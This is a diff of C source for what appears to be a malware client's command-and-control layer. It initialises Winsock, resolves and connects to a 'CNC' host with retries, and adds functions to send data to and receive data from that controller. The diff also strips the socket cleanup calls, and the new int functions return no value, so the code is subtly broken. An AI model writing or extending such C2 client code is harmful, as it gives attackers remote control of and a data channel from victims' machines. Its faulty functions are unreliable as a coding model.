@@ -17,9 +17,9 @@ void init_winsock()
     int ret;
 
     ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (ret != 0)
+    if (ret)
     {
-        log_error("WSAStartup failed: %d\n", ret);
+        log_error("WSAStartup failed: %d", ret);
         exit(EXIT_FAILURE);
     }
     log_debug("Initialized Winsock.");
@@ -35,8 +35,7 @@ void get_cnc_addrinfo(char *host, struct addrinfo **result)
     ret = getaddrinfo(host, CNC_PORT, &hints, result);
     if (ret)
     {
-        log_error("getaddrinfo failed: %d\n", ret);
-        WSACleanup();
+        log_error("getaddrinfo failed: %d", ret);
         exit(EXIT_FAILURE);
     }
 
@@ -44,8 +43,7 @@ void get_cnc_addrinfo(char *host, struct addrinfo **result)
     ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
     if (ret)
     {
-        log_error("WSAAddressToStringA failed: %d\n", ret);
-        WSACleanup();
+        log_error("WSAAddressToStringA failed: %d", ret);
         exit(EXIT_FAILURE);
     }
     log_debug("CNC's address: %s", cnc_addr);
@@ -57,8 +55,7 @@ void init_cnc_sock()
 
     if (cnc_sock == INVALID_SOCKET)
     {
-        log_error("Error at socket(): %ld\n", WSAGetLastError());
-        WSACleanup();
+        log_error("Error at socket(): %ld", WSAGetLastError());
         exit(EXIT_FAILURE);
     }
 }
@@ -75,9 +72,7 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
             ret = WSAGetLastError();
             if (ret != WSAECONNREFUSED)
             {
-                log_error("Error at connect(): %ld\n", ret);
-                closesocket(cnc_sock);
-                WSACleanup();
+                log_error("Error at connect(): %ld", ret);
                 exit(EXIT_FAILURE);
             }
             else
@@ -91,6 +86,30 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
             log_info("Connected to CNC.");
             return;
         }
+    }
+}
+
+int send_to_cnc(void *buf, size_t len)
+{
+    int ret;
+
+    ret = send(cnc_sock, buf, len, 0);
+    if (ret == SOCKET_ERROR)
+    {
+        log_error("Error at send(): %ld", WSAGetLastError());
+        exit(EXIT_FAILURE);
+    }
+}
+
+int recv_from_cnc(void *buf, size_t len)
+{
+    int ret;
+
+    ret = recv(cnc_sock, buf, len, 0);
+    if (ret == SOCKET_ERROR)
+    {
+        log_error("Error at recv(): %ld", WSAGetLastError());
+        exit(EXIT_FAILURE);
     }
 }
 
